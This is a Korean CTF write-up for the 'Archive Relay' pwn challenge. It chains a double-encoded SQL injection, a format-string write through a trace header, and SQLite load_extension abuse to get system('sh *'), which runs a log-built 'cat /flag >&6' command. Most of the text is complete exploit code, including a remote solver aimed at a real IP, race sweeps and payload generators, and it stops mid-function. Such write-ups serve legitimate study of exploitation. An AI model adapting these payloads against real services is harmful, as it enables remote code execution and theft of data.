# UHCON 2026 — Archive Relay Write-up

## 결과와 산출물

- 분야: pwn
- 제공 바이너리 SHA-256: `a807324e2066dfe474fd15b8cb1e49653887fe747c298d565ab94477eead3f77`
- 표준 진입점: `solve.py`
- 실제 원격 exploit: `solve_remote.py`
- 로컬 재현 도구: `root_sh_marker_sweep.py`, `root_sh_reverse_sweep.py`, `root_sh_capture.py`

원격 서비스에서 회수해 `flag.txt`에 보관한 플래그는 다음과 같다.

```text
FLAG{2fd37f6760d8687fde426930310af3cec81b1e6f2e281883675c234a5239e9c5eb54d491535b4cacbc14ac12f117b3f6a9ad00cf7a007fa9253265c19befd36708}
```

저장된 자료에는 이 값에 대한 CTFd `correct` 응답 전문은 없다. 따라서 이 문서는 원격 회수와 로컬 exploit 검증을 구분해 기록한다.

## 1. 공격 표면

서비스는 `/api/login`과 `/api/trace`를 제공한다. 분석에서 사용한 결함은 세 가지다.

1. 로그인 계정 값이 URL decoding을 두 번 거친 뒤 SQL 문에 들어가므로 double-encoded SQL injection이 가능하다.
2. operator 권한의 `/api/trace`는 `X-Trace-Note`를 audit log에 기록할 때 사용자 문자열을 포맷 문자열로 사용한다.
3. SQLite extension entry point를 호출하는 ABI와 `system()`의 첫 인자 ABI가 겹친다.

먼저 다음 계정 문자열을 이중 URL 인코딩해 operator 세션을 얻는다.

```sql
x' OR role='operator' --␠
```

위 `␠`는 SQL 주석 문법을 만족시키기 위한 실제 공백 한 칸이다.

그 뒤 trace note의 `%n` 계열 변환을 이용한다. 관측된 스택 배치에서 arg153은 arg179가 저장된 슬롯을 가리키고, arg179는 `sqlite3 *db`를 가리킨다. 따라서 순차 포맷 변환으로 arg179의 하위 바이트를 먼저 바꾼 뒤 `db+offset`에 1, 2, 4바이트 값을 쓸 수 있다.

## 2. extension loading 활성화

대상 DB의 `db+0x32`에 있는 extension-loading 상태 바이트를 `0x07`로 바꾸면 다음 SQL이 실제 동적 로더 경로에 진입한다.

```sql
x' UNION SELECT load_extension('LIBRARY','system') --␠
```

`load_extension()`은 선택한 공유 라이브러리에서 이름이 `system`인 심볼을 찾고 SQLite extension entry 함수처럼 호출한다. 정상 entry 함수의 첫 인자는 `sqlite3 *db`이고, libc `system()` 역시 첫 인자를 명령 문자열 포인터로 해석한다. 결국 호출 순간 DB 객체의 선두가 문자열이면 다음과 같은 효과가 난다.

```c
system((char *)db);
```

DB 객체를 너무 일찍 덮으면 SQLite가 먼저 `db->pVfs` 등을 읽다가 죽는다. 따라서 심볼 해석과 trace worker를 겹치는 TOCTOU race가 필요하다.

## 3. `sh *` 명령과 audit log 스크립트

DB 선두에는 최종적으로 아래 5바이트를 만든다.

```text
73 68 20 2a 00    sh *\0
```

seed trace는 `db+2`에 `%n`으로 `0x00002a20`을 쓰고, final trace는 `db+0`에 `%hn`으로 `0x6873`을 쓴다. 이 순서가 완성되면 extension entry 호출은 `system("sh *")`가 된다.

현재 작업 디렉터리에서 glob의 첫 파일은 `archive-relay-audit.log`이다. 따라서 audit log 자체를 셸 스크립트로 만들면 `sh *`가 그 파일을 실행한다. final note는 포맷 인자들이 가리키는 future slot의 하위 바이트도 조절하여 줄바꿈, `>`와 `&`를 출력하고 다음 줄을 합성한다.

```sh
cat /flag >&6 #
```

마지막 `#`은 서비스가 뒤에 붙이는 ` -> accepted` 등의 audit suffix를 주석 처리한다. fd 6은 race 전에 열어 둔 login socket의 서버 측 descriptor다. 이 descriptor에는 `O_CLOEXEC`가 없어서 `system()`이 띄운 `/bin/sh`에도 상속된다.

## 4. race 순서

`solve_remote.py`의 한 시도는 다음 순서다.

1. `3.34.239.114:1337` bootstrap에 연결해 임시 HTTP 포트를 받는다.
2. double-encoded SQLi로 operator 세션을 얻는다.
3. 단독 trace로 `db+0x32 = 7`을 만들고 worker 완료를 잠시 기다린다.
4. login, final trace, seed trace용 TCP 연결을 미리 연다.
5. `load_extension(..., 'system')` login을 먼저 전송한다.
6. 수십~수천 마이크로초 뒤 audit-script/final trace와 `db+2` seed trace를 전송한다.
7. 세 socket 응답을 모아 `FLAG{...}`를 찾는다.

심볼 해석 시간을 늘리기 위해 기본 후보에는 반복된 `/proc/self/root`를 앞에 붙인 `libkrb5.so.3` 경로를 사용한다. lead time과 라이브러리 경로를 바꾸며 새 인스턴스에서 반복하고, 플래그를 찾은 즉시 `flag.txt`와 성공 메타데이터를 저장하도록 구현되어 있다.

## 5. 검증 증거

공격 체인의 위험한 부분은 원격 재시도 전에 로컬에서 두 단계로 검증했다.

- `root_sh_reverse_results.json`의 index 10은 `lead_us=100`, `gap_us=0`, `mode=separate`, `won=true`를 기록한다. 대응 경로 `root_sh_reverse/010_separate_100_0/PWNED`가 실제로 존재하므로 `system("sh *")`와 audit script 실행이 확인된다.
- `root_sh_capture_results.json`의 index 1은 `captured=true`이고 login socket 응답 앞에서 로컬 hostname `DESKTOP-GFDJA0C`를 회수했다. 이는 audit script가 활성 socket fd로 파일 내용을 보내는 단계까지 검증한다.
- 최종 `flag.txt`는 원격 solver가 같은 redirection 경로로 회수한 값이다.

표준 진입점의 기본 동작은 네트워크를 사용하지 않고 위 세 증거를 검사한다.

```bash
cd pwn/05-archive-relay
python3 solve.py
```

원격 공격은 새 인스턴스를 만들므로 명시적으로 선택해야 한다.

```bash
python3 solve.py --remote
```

race는 환경과 부하에 민감하다. 저장된 플래그와 로컬 증거를 검토하는 데에는 원격 실행이 필요하지 않다.

## 최종 풀이 코드 전체

아래 코드는 표준 진입점과 실제 원격 exploit의 의존성 원문 전체다. `solve_remote.py`는 `root_sh_marker_sweep.py`를, 다시 그 모듈은 `archive_flag_agent.py`를 불러오므로 네 파일을 모두 포함한다. 자격증명은 코드에 없으며 원격 bootstrap 자체가 별도 토큰 인자를 요구하지 않는다.

### `solve.py`

```python
#!/usr/bin/env python3
"""Safe standard entry point for the Archive Relay solver.

The default action only validates the saved local/remote artifacts.  Pass
``--remote`` explicitly to run the timing-sensitive solver in
``solve_remote.py``; that action creates a fresh challenge instance.
"""

from __future__ import annotations

import argparse
import json
from pathlib import Path
import re


ROOT = Path(__file__).resolve().parent
FLAG_RE = re.compile(r"FLAG\{[0-9a-f]+\}")


def verify_artifacts() -> int:
    flag_path = ROOT / "flag.txt"
    reverse_path = ROOT / "root_sh_reverse_results.json"
    capture_path = ROOT / "root_sh_capture_results.json"
    marker_path = ROOT / "root_sh_reverse/010_separate_100_0/PWNED"

    flag = flag_path.read_text(encoding="utf-8").strip()
    reverse = json.loads(reverse_path.read_text(encoding="utf-8"))
    capture = json.loads(capture_path.read_text(encoding="utf-8"))

    checks = {
        "remote flag has the expected format": bool(FLAG_RE.fullmatch(flag)),
        "local sh-* race created PWNED": marker_path.is_file()
        and any(row.get("won") for row in reverse),
        "local active-socket redirection captured data": any(
            row.get("captured") for row in capture
        ),
    }
    for label, passed in checks.items():
        print(f"[{'OK' if passed else 'FAIL'}] {label}")
    if all(checks.values()):
        print(f"[OK] saved remote flag: {flag}")
        return 0
    return 1


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--remote",
        action="store_true",
        help="run the network solver (fresh remote instance; explicit opt-in)",
    )
    args = parser.parse_args()
    if not args.remote:
        return verify_artifacts()

    from solve_remote import main as remote_main

    remote_main()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

### `solve_remote.py`

```python
#!/usr/bin/env python3
"""Remote solver for UHCON Archive Relay."""

from __future__ import annotations

import http.client
import importlib.util
import json
from pathlib import Path
import re
import select
import socket
import time
import urllib.parse


ROOT = Path(__file__).resolve().parent
BOOTSTRAP_HOST = "3.34.239.114"
BOOTSTRAP_PORT = 1337

spec = importlib.util.spec_from_file_location("sh_sweep", ROOT / "root_sh_marker_sweep.py")
sh_sweep = importlib.util.module_from_spec(spec)
assert spec.loader is not None
spec.loader.exec_module(sh_sweep)


def bootstrap_instance() -> tuple[socket.socket, int, bytes]:
    sock = socket.create_connection((BOOTSTRAP_HOST, BOOTSTRAP_PORT), timeout=10)
    sock.settimeout(15)
    banner = bytearray()
    deadline = time.monotonic() + 20
    while time.monotonic() < deadline:
        block = sock.recv(4096)
        if not block:
            break
        banner.extend(block)
        match = re.search(rb"site:\s*http://[^:]+:(\d+)/", banner)
        if match:
            return sock, int(match.group(1)), bytes(banner)
    sock.close()
    raise RuntimeError(f"bootstrap banner did not contain a port: {bytes(banner)!r}")


def request(host: str, port: int, method: str, path: str, *, headers=None, body: bytes = b""):
    conn = http.client.HTTPConnection(host, port, timeout=6)
    conn.request(method, path, body=body, headers=headers or {})
    response = conn.getresponse()
    data = response.read()
    status = response.status
    conn.close()
    return status, data


def operator_session(host: str, port: int) -> str:
    body = (
        b"account=x%2527%2520OR%2520role%253D%2527operator%2527"
        b"%2520%252D%252D%2520&pin=x"
    )
    status, data = request(
        host, port, "POST", "/api/login",
        headers={"Content-Type": "application/x-www-form-urlencoded"}, body=body,
    )
    if status != 200:
        raise RuntimeError((status, data))
    match = re.search(rb'"session":"([0-9a-f]+)"', data)
    if not match:
        raise RuntimeError(data)
    return match.group(1).decode()


def trace(host: str, port: int, session: str, note: str) -> tuple[int, bytes]:
    return request(
        host, port, "POST", "/api/trace",
        headers={"X-Session": session, "X-Trace-Note": note},
    )


def login_request(host: str, port: int, library: str) -> bytes:
    sql = f"x' UNION SELECT load_extension('{library}','system') -- "
    account = urllib.parse.quote(urllib.parse.quote(sql, safe=""), safe="")
    body = f"account={account}&pin=x".encode()
    return (
        f"POST /api/login HTTP/1.1\r\nHost: {host}:{port}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode() + body


def busy_wait_us(value: int) -> None:
    target = time.perf_counter_ns() + value * 1000
    while time.perf_counter_ns() < target:
        pass


def recv_all(sockets: list[socket.socket], timeout: float = 8.0) -> list[bytes]:
    buffers = [bytearray() for _ in sockets]
    by_fd = {sock.fileno(): index for index, sock in enumerate(sockets)}
    live = set(sockets)
    deadline = time.monotonic() + timeout
    while live and time.monotonic() < deadline:
        readable, _, _ = select.select(list(live), [], [], 0.1)
        for sock in readable:
            index = by_fd[sock.fileno()]
            try:
                data = sock.recv(65536)
            except (ConnectionResetError, OSError):
                data = b""
            if data:
                buffers[index].extend(data)
            else:
                live.remove(sock)
    for sock in sockets:
        sock.close()
    return [bytes(buffer) for buffer in buffers]


def race(host: str, port: int, session: str, lead_us: int, library: str) -> list[bytes]:
    final_note = sh_sweep.redirect_final_note("/flag", 6)
    seed_note = sh_sweep.archive.write_note(0x02, 0x2A20, "n", tail_width=0)
    login_sock = socket.create_connection((host, port), timeout=5)
    final_sock = socket.create_connection((host, port), timeout=5)
    seed_sock = socket.create_connection((host, port), timeout=5)
    for sock in (login_sock, final_sock, seed_sock):
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    time.sleep(0.01)  # allow the server to accept sockets in FD 6/7/8 order
    login_sock.sendall(login_request(host, port, library))
    busy_wait_us(lead_us)
    final_sock.sendall(sh_sweep.archive.raw_trace_request(host, port, session, final_note))
    seed_sock.sendall(sh_sweep.archive.raw_trace_request(host, port, session, seed_note))
    return recv_all([login_sock, final_sock, seed_sock])


def main() -> None:
    leads = [50, 100, 200, 350, 500, 750, 1000, 1500, 2000, 3000, 5000]
    libraries = [
        "/proc/self/root" * 5 + "/usr/lib/x86_64-linux-gnu/libkrb5.so.3",
        "/usr/lib/x86_64-linux-gnu/libkrb5.so.3",
    ]
    attempts: list[dict[str, object]] = []
    for attempt_index in range(44):
        lead_us = leads[attempt_index % len(leads)]
        library = libraries[(attempt_index // len(leads)) % len(libraries)]
        bootstrap = None
        try:
            bootstrap, port, banner = bootstrap_instance()
            session = operator_session(BOOTSTRAP_HOST, port)
            enable = sh_sweep.archive.write_note(0x32, 0x07, "hhn")
            status, body = trace(BOOTSTRAP_HOST, port, session, enable)
            if status != 202:
                raise RuntimeError((status, body))
            time.sleep(0.08)
            responses = race(BOOTSTRAP_HOST, port, session, lead_us, library)
            combined = b"\n".join(responses)
            match = re.search(rb"FLAG\{[^}\r\n]+\}", combined)
            row = {
                "attempt": attempt_index,
                "port": port,
                "lead_us": lead_us,
                "library": library,
                "response_lengths": [len(item) for item in responses],
                "captured": bool(match),
                "banner": banner.decode("utf-8", "replace"),
            }
            attempts.append(row)
            print(json.dumps(row, sort_keys=True), flush=True)
            if match:
                flag = match.group(0).decode()
                with open(f"{ROOT}/flag.txt", "w", encoding="utf-8") as handle:
                    handle.write(flag + "\n")
                with open(f"{ROOT}/remote_success.json", "w", encoding="utf-8") as handle:
                    json.dump({"flag": flag, "attempt": row, "attempts": attempts}, handle, indent=2)
                print("CAPTURED", flag, flush=True)
                return
        except Exception as error:
            row = {"attempt": attempt_index, "lead_us": lead_us, "error": repr(error)}
            attempts.append(row)
            print(json.dumps(row, sort_keys=True), flush=True)
        finally:
            if bootstrap is not None:
                bootstrap.close()
    with open(f"{ROOT}/remote_attempts.json", "w", encoding="utf-8") as handle:
        json.dump(attempts, handle, indent=2)
    raise SystemExit("remote flag was not captured")


if __name__ == "__main__":
    main()
```

### `root_sh_marker_sweep.py`

```python
#!/usr/bin/env python3
"""Local timing sweep for the Archive Relay ``sh *`` command primitive."""

from __future__ import annotations

import argparse
import importlib.util
import json
import os
from pathlib import Path
import random
import select
import socket
import subprocess
import time
import urllib.parse


ROOT = Path(__file__).resolve().parent
PROB = ROOT / "package" / "deploy" / "prob"

spec = importlib.util.spec_from_file_location("archive_flag", ROOT / "archive_flag_agent.py")
archive = importlib.util.module_from_spec(spec)
assert spec.loader is not None
spec.loader.exec_module(archive)


def safe_final_note(script_line: str, tail_width: int = 0) -> str:
    """Write db[0:2] = b'sh' and append a filter-safe audit script line."""
    if not script_line.endswith(" "):
        raise ValueError("script line must end with one space before the generated comment")
    if any(character in script_line for character in "#>&;"):
        raise ValueError("script line contains a trace-filtered metacharacter")
    chunks = ["%199c"]
    chunks.extend(["%.s"] * 135)       # args2..136
    chunks.append("%hhn")              # arg137 -> arg185 = LF
    chunks.append("%254c")             # arg138, count low db+0 (0x08)
    chunks.extend(["%.s"] * 14)        # args139..152
    chunks.append("%hhn")              # arg153 -> arg179 = db+0
    chunks.append("%2c")               # arg154, count low LF
    chunks.extend(["%.s"] * 30)        # args155..184; precision zero is safe
    chunks.append("%c")                # arg185 -> LF, total count 523
    chunks.append(script_line)
    chunks.append("%31$c")             # generated '#': comment the audit suffix
    width = 0x6873 - (523 + len(script_line) + 1)
    if width <= 0:
        raise ValueError("script line is too long for the sh halfword count")
    chunks.append(f"%07${width}c")
    chunks.append("%179$hn")           # db[0:2] = b'sh'
    if tail_width:
        chunks.append(f"%07${tail_width}c")
    note = "".join(chunks)
    if len(note) > 760:
        raise AssertionError(len(note))
    return note


def marker_final_note(tail_width: int) -> str:
    """Local marker form of :func:`safe_final_note`."""
    return safe_final_note("touch PWNED ", tail_width)


def redirect_final_note(source: str, server_fd: int) -> str:
    """Write ``sh`` and synthesize a new ``cat SOURCE >&FD`` audit line."""
    if not source.startswith("/") or any(character in source for character in " #>&;$()`'\""):
        raise ValueError("source must be a simple absolute path")
    if not 0 <= server_fd <= 9:
        raise ValueError("this compact payload supports one-digit descriptors")
    command_prefix = f"cat {source} "
    chunks = ["%227c"]                  # total 294, low byte '&'
    chunks.extend(["%.s"] * 135)       # args2..136
    chunks.append("%hhn")               # arg137 -> arg185 = '&'
    chunks.append("%226c")              # arg138, total 520, low db+0
    chunks.extend(["%.s"] * 14)        # args139..152
    chunks.append("%hhn")               # arg153 -> arg179 = db+0
    chunks.append("%54c")               # arg154, total 574, low byte '>'
    chunks.extend(["%.s"] * 9)         # args155..163
    chunks.append("%hhn")               # arg164 -> arg183 = '>'
    chunks.append("%204c")              # arg165, total 778, low byte LF
    chunks.extend(["%.s"] * 4)         # args166..169
    chunks.append("%hhn")               # arg170 -> arg177 = LF
    chunks.append("%25960c")            # arg171, total 0x6872
    chunks.extend(["%.s"] * 5)         # args172..176
    chunks.append("%c")                 # arg177 -> LF, total 0x6873
    chunks.append("%.s")                # arg178
    chunks.append("%hn")                # arg179 -> db[0:2] = b'sh'
    chunks.append(command_prefix)
    chunks.extend(["%.s"] * 3)         # args180..182
    chunks.append("%c")                 # arg183 -> '>'
    chunks.append("%.s")                # arg184
    chunks.append("%c")                 # arg185 -> '&'
    chunks.append(f"{server_fd} ")
    chunks.append("%31$c")              # generated '#': comment audit suffix
    count = 0x6873 + len(command_prefix) + 2 + len(f"{server_fd} ") + 1
    restore_pad = (-count) & 0xFF
    if restore_pad == 0:
        restore_pad = 256
    chunks.append(f"%07${restore_pad}c")
    chunks.append("%164$hhn")            # restore arg183's original NULL low byte
    note = "".join(chunks)
    if len(note) > 760:
        raise AssertionError(len(note))
    return note


def combined_marker_note() -> str:
    """Atomically form ``sh *`` and append the marker in one trace record."""
    marker = "touch PWNED "
    chunks = ["%199c"]                  # total 266, low byte LF/db+2
    chunks.extend(["%.s"] * 135)       # args2..136
    chunks.append("%hhn")               # arg137 -> arg185 = LF
    chunks.extend(["%.s"] * 15)        # args138..152
    chunks.append("%hhn")               # arg153 -> arg179 = db+2
    chunks.append("%10518c")            # arg154, total 0x2a20
    chunks.extend(["%.s"] * 24)        # args155..178
    chunks.append("%n")                 # db[2:6] = b' *\\0\\0'
    chunks.extend(["%.s"] * 5)         # args180..184
    chunks.append("%c")                 # arg185 -> LF, total 0x2a21
    chunks.append(marker)
    chunks.append("%31$c")              # generated '#', total 0x2a2e
    chunks.append("%07$218c")           # total low byte 0x08
    chunks.append("%153$hhn")           # arg179 -> db+0
    chunks.append("%07$15723c")         # total 0x6873
    chunks.append("%179$hn")            # db[0:2] = b'sh'
    note = "".join(chunks)
    if len(note) > 760:
        raise AssertionError(len(note))
    return note


def login_wire(host: str, port: int, library: str) -> bytes:
    sql = f"x' UNION SELECT load_extension('{library}','system') -- "
    account = urllib.parse.quote(urllib.parse.quote(sql, safe=""), safe="")
    body = f"account={account}&pin=x".encode()
    return (
        f"POST /api/login HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode() + body


def recv_all(sockets: list[socket.socket], timeout: float = 3.0) -> list[bytes]:
    buffers = [bytearray() for _ in sockets]
    by_fd = {sock.fileno(): index for index, sock in enumerate(sockets)}
    live = set(sockets)
    deadline = time.monotonic() + timeout
    while live and time.monotonic() < deadline:
        readable, _, _ = select.select(list(live), [], [], 0.05)
        for sock in readable:
            index = by_fd[sock.fileno()]
            try:
                data = sock.recv(65536)
            except (ConnectionResetError, OSError):
                data = b""
            if data:
                buffers[index].extend(data)
            else:
                live.remove(sock)
    for sock in sockets:
        sock.close()
    return [bytes(buffer) for buffer in buffers]


def wait_port(port: int) -> None:
    deadline = time.monotonic() + 2.0
    while time.monotonic() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.05):
                return
        except OSError:
            time.sleep(0.01)
    raise RuntimeError("local service did not open")


def busy_wait_us(value: int) -> None:
    target = time.perf_counter_ns() + value * 1000
    while time.perf_counter_ns() < target:
        pass


def race(
    port: int,
    session: str,
    notes: list[str],
    delay_us: int,
    trace_gap_us: int,
    library: str,
) -> list[bytes]:
    host = "127.0.0.1"
    login_sock = socket.create_connection((host, port), timeout=2)
    trace_socks = [socket.create_connection((host, port), timeout=2) for _ in notes]
    login_request = login_wire(host, port, library)
    trace_requests = [archive.raw_trace_request(host, port, session, note) for note in notes]
    if delay_us >= 0:
        for item_index, (sock, request) in enumerate(zip(trace_socks, trace_requests)):
            sock.sendall(request)
            if item_index + 1 < len(trace_socks):
                busy_wait_us(trace_gap_us)
        busy_wait_us(delay_us)
        login_sock.sendall(login_request)
    else:
        login_sock.sendall(login_request)
        busy_wait_us(-delay_us)
        for item_index, (sock, request) in enumerate(zip(trace_socks, trace_requests)):
            sock.sendall(request)
            if item_index + 1 < len(trace_socks):
                busy_wait_us(trace_gap_us)
    return recv_all([login_sock, *trace_socks])


def attempt(index: int, params: tuple[int, int, int, int, int], base_port: int) -> dict[str, object]:
    delay_us, trace_gap_us, gate_width, seed_tail, final_tail = params
    port = base_port + index
    run_dir = f"{ROOT}/root_sh_sweep/{index:03d}_{delay_us:+05d}_{trace_gap_us}_{gate_width}_{seed_tail}_{final_tail}"
    os.makedirs(run_dir, exist_ok=True)
    log_handle = open(f"{run_dir}/prob.log", "wb")
    process = subprocess.Popen(
        [PROB, str(port)],
        cwd=run_dir,
        stdin=subprocess.DEVNULL,
        stdout=log_handle,
        stderr=subprocess.STDOUT,
    )
    try:
        wait_port(port)
        session = archive.login(port)
        enable = archive.write_note(0x32, 0x07, "hhn")
        status, body = archive.trace(port, session, enable)
        if status != 202:
            raise RuntimeError((status, body))
        time.sleep(0.08)
        notes = [
            f"%{gate_width}c",
            archive.write_note(0x02, 0x2A20, "n", tail_width=seed_tail),
            marker_final_note(final_tail),
        ]
        library = "/proc/self/root" * 5 + "/usr/lib/x86_64-linux-gnu/libkrb5.so.3"
        responses = race(port, session, notes, delay_us, trace_gap_us, library)
        time.sleep(0.08)
        won = os.path.exists(f"{run_dir}/PWNED")
        return {
            "index": index,
            "delay_us": delay_us,
            "trace_gap_us": trace_gap_us,
            "gate_width": gate_width,
            "seed_tail": seed_tail,
            "final_tail": final_tail,
            "won": won,
            "alive": process.poll() is None,
            "response_lengths": [len(item) for item in responses],
        }
    except Exception as error:
        return {
            "index": index,
            "delay_us": delay_us,
            "trace_gap_us": trace_gap_us,
            "gate_width": gate_width,
            "seed_tail": seed_tail,
            "final_tail": final_tail,
            "won": False,
            "alive": process.poll() is None,
            "error": repr(error),
        }
    finally:
        if process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=1)
            except subprocess.TimeoutExpired:
                process.kill()
        log_handle.close()


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--limit", type=int, default=160)
    parser.add_argument("--base-port", type=int, default=19600)
    args = parser.parse_args()
    grid = [
        (delay, trace_gap, gate, seed_tail, final_tail)
        for delay in (-3000, -2000, -1500, -1000, -500, 0, 250, 500, 750, 1000, 1500)
        for trace_gap in (100, 250, 500, 1000)
        for gate in (200000, 500000, 1000000, 1500000)
        for seed_tail in (0, 100000, 300000, 500000)
        for final_tail in (100000, 500000)
    ]
    random.Random(0x5348).shuffle(grid)
    results: list[dict[str, object]] = []
    for index, params in enumerate(grid[: args.limit]):
        row = attempt(index, params, args.base_port)
        results.append(row)
        print(json.dumps(row, sort_keys=True), flush=True)
        if row.get("won"):
            break
    with open(f"{ROOT}/root_sh_sweep_results.json", "w", encoding="utf-8") as handle:
        json.dump(results, handle, indent=2, sort_keys=True)


if __name__ == "__main__":
    main()
```

### `archive_flag_agent.py`

```python
#!/usr/bin/env python3
"""Archive Relay post-system exploit/probe helpers (flag-path agent)."""

from __future__ import annotations

import argparse
import http.client
from pathlib import Path
import re
import select
import socket
import subprocess
import time
import urllib.parse


def request(port: int, method: str, path: str, *, headers=None, body: bytes = b""):
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
    conn.request(method, path, body=body, headers=headers or {})
    response = conn.getresponse()
    data = response.read()
    conn.close()
    return response.status, data


def login(port: int) -> str:
    body = (
        b"account=x%2527%2520OR%2520role%253D%2527operator%2527"
        b"%2520%252D%252D%2520&pin=x"
    )
    status, data = request(
        port,
        "POST",
        "/api/login",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        body=body,
    )
    if status != 200:
        raise RuntimeError((status, data))
    match = re.search(rb'"session":"([0-9a-f]+)"', data)
    if not match:
        raise RuntimeError(data)
    return match.group(1).decode()


def trace(port: int, session: str, note: str) -> tuple[int, bytes]:
    return request(
        port,
        "POST",
        "/api/trace",
        headers={"X-Session": session, "X-Trace-Note": note},
    )


def positional_probe(start: int, end: int) -> str:
    # Two hexadecimal-looking digits immediately after '%' satisfy the edge
    # validator; wider indices naturally begin with two decimal/hex digits.
    fields = []
    for position in range(start, end + 1):
        if position < 10:
            spec = f"%0{position}$p"
        else:
            spec = f"%{position}$p"
        fields.append(f"{position}={spec}")
    return ",".join(fields)


def write_note(
    target_offset: int,
    value: int,
    final_spec: str,
    *,
    prefix_len: int = 67,
    db_low: int = 0x08,
    tail_width: int = 0,
) -> str:
    """Retarget arg179 through arg153, then perform one DB write."""
    target_low = (db_low + target_offset) & 0xFF
    first_width = (target_low - prefix_len) & 0xFF
    if first_width == 0:
        first_width = 256
    first_count = prefix_len + first_width
    if final_spec == "hhn":
        second_width = (value - first_count) & 0xFF
        if second_width == 0:
            second_width = 256
    elif final_spec in {"hn", "n"}:
        second_width = value - first_count
        if second_width <= 0:
            raise ValueError((value, first_count))
    else:
        raise ValueError(final_spec)

    chunks = [f"%{first_width}c"]
    chunks.extend(["%.s"] * 151)          # args2..152
    chunks.append("%hhn")                 # arg153: arg179 -> db+offset
    chunks.append(f"%{second_width}c")    # arg154
    chunks.extend(["%.s"] * 24)           # args155..178
    chunks.append(f"%{final_spec}")       # arg179: DB write
    if tail_width:
        chunks.append(f"%{tail_width}c")  # arg180: hold shared audit mutex
    note = "".join(chunks)
    if len(note) > 760:
        raise AssertionError(len(note))
    return note


def final_audit_note(prefix_len: int = 67, socket_fd: int = 6) -> str:
    """Emit a cp line and finish db[0:2] = ``b'sh'`` with one %hn.

    A preceding trace writes db[2:6] = ``b' *\\0\\0'``.  After the %hn,
    a bounded 500KB pad keeps this worker inside fprintf so the racing
    load_extension thread can call system while the command is complete.
    """
    if prefix_len != 67:
        raise ValueError("this compact layout assumes a one-digit worker/count prefix")
    chunks = ["%199c"]                       # arg1: count 266, low LF
    chunks.extend(["%.s"] * 135)            # args2..136
    chunks.append("%hhn")                    # arg137 -> arg185 = LF
    chunks.append("%254c")                   # arg138, count low db+0 (0x08)
    chunks.extend(["%.s"] * 14)             # args139..152
    chunks.append("%hhn")                    # arg153 -> arg179 = db+0
    chunks.append("%2c")                     # arg154, count low LF
    chunks.extend(["%.s"] * 9)              # args155..163
    chunks.append("%hhn")                    # arg164 -> arg183 = LF
    chunks.extend(["%.s"] * 5)              # args165..169
    chunks.append("%hhn")                    # arg170 -> arg177 = LF
    chunks.extend(["%.s"] * 6)              # args171..176
    chunks.append("%c")                      # arg177 -> LF, count 523
    chunks.append(f"cp /flag /proc/self/fd/{socket_fd} ")
    chunks.append("%31$c")                   # fixed '#' begins shell comment
    chunks.append("%07$26190c")              # total count 0x6873
    chunks.append("%179$hn")                 # db[0:2] = 's', 'h'
    chunks.append("%183$c")                  # cached LF ends comment
    chunks.append("cp /flag /proc/self/fd/6 ")
    chunks.append("%31$c")                   # comment second command's padding
    chunks.append("%07$500000c")             # post-write race window
    chunks.append("%185$c")                  # cached LF
    note = "".join(chunks)
    if len(note) > 760:
        raise AssertionError(len(note))
    return note


def trigger_load_extension(host: str, port: int) -> bytes:
    sql = "x' UNION SELECT load_extension('/lib/x86_64-linux-gnu/libc.so.6','system') -- "
    # One form decode plus the target's repeated account canonicalization.
    account = urllib.parse.quote(urllib.parse.quote(sql, safe=""), safe="")
    body = f"account={account}&pin=x".encode()
    wire = (
        f"POST /api/login HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode() + body
    captured = bytearray()
    with socket.create_connection((host, port), timeout=5) as sock:
        sock.sendall(wire)
        sock.settimeout(2)
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            captured.extend(chunk)
    return bytes(captured)


def raw_trace_request(host: str, port: int, session: str, note: str) -> bytes:
    return (
        f"POST /api/trace HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"X-Session: {session}\r\n"
        f"X-Trace-Note: {note}\r\n"
        "Content-Length: 0\r\n"
        "Connection: close\r\n\r\n"
    ).encode()


def raw_trigger_request(host: str, port: int) -> bytes:
    sql = "x' UNION SELECT load_extension('/lib/x86_64-linux-gnu/libc.so.6','system') -- "
    account = urllib.parse.quote(urllib.parse.quote(sql, safe=""), safe="")
    body = f"account={account}&pin=x".encode()
    return (
        f"POST /api/login HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode() + body


def recv_all(sock: socket.socket, timeout: float = 1.0) -> bytes:
    result = bytearray()
    sock.settimeout(timeout)
    while True:
        try:
            part = sock.recv(4096)
        except (socket.timeout, ConnectionResetError):
            break
        if not part:
            break
        result.extend(part)
    return bytes(result)


def race_final_traces(
    host: str,
    port: int,
    session: str,
    notes: list[str],
    trigger_after_trace: float,
) -> tuple[bytes, bytes]:
    # Connect the login socket first so it receives the stable server FD 6.
    login_sock = socket.create_connection((host, port), timeout=3)
    time.sleep(0.005)
    trace_socks = [socket.create_connection((host, port), timeout=3) for _ in notes]
    login_wire = raw_trigger_request(host, port)
    trace_wires = [raw_trace_request(host, port, session, note) for note in notes]

    def send_traces() -> None:
        for sock, wire in zip(trace_socks, trace_wires):
            sock.sendall(wire)

    start = time.perf_counter()
    if trigger_after_trace >= 0:
        send_traces()
        # A readable 202 response means each request was parsed and its worker
        # was queued.  This keeps the final waiter ahead of xDlSym on the
        # shared mutex instead of relying only on socket-send order.
        pending = set(trace_socks)
        queue_deadline = time.perf_counter() + 0.25
        while pending and time.perf_counter() < queue_deadline:
            ready, _, _ = select.select(list(pending), [], [], 0.001)
            pending.difference_update(ready)
        target = time.perf_counter() + trigger_after_trace
